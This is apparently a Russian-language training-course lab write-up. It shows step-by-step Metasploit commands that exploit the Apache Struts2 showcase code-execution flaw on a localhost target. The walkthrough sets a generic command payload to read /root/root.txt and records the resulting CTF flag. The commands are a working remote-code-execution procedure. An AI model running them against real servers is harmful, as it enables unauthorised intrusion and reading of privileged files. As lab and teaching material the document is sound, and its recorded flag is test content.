*****************************************************************************************
************** Эксплуатация уязвимостей сетевых сервисов ********************************
*****************************************************************************************

*************** 6.3 Практика «Эксплуатация уязвимостей 1-го дня сетевых сервисов» *******

$ sudo msfdb init && msfconsole

search apache struts2 showcase

exploit/multi/http/struts2_code_exec_showcase
# Выбираем данный эксплоит - y
# Настраиваем опции эксплоита
# RHOST наш атакуемый сайт, ввести его IP или hostname
msf6 exploit(multi/http/struts2_code_exec_showcase) > set RHOST 127.0.0.1

# RPORT порт на котором висит сайт
msf6 exploit(multi/http/struts2_code_exec_showcase) > set rport 1337

# в этом эксплоите есть параметр TARGETURI и указан путь по умолчанию, наша задача выявить правильный путь 
# в примере было упрощено - http://localhost:1337/integration/saveGangster.action
# в примере путь /integration/saveGangster.action
# TARGETURI меняем на /integration/saveGangster.action
msf6 exploit(multi/http/struts2_code_exec_showcase) > set targeturi /integration/saveGangster.action

# Подготовка PAYLOAD (нагрузки), возбмем CMD (командную оболочку) для выполнения разных команд
msf6> set PAYLOAD cmd/unix/generic
msf6 exploit(multi/http/struts2_code_exec_showcase) > set payload cmd/unix/generic

# CMD введем исполняемую команду (это может быть id, ls, cat и д.р.)
# так как в задании указано прочитать в папке /root/ файл root.txt
msf6 exploit(multi/http/struts2_code_exec_showcase) > set cmd cat /root/root.txt

# RUN запуск эксплоита
msf6 exploit(multi/http/struts2_code_exec_showcase) > run

FLAF 76e008325662b32aa33af6c000721579
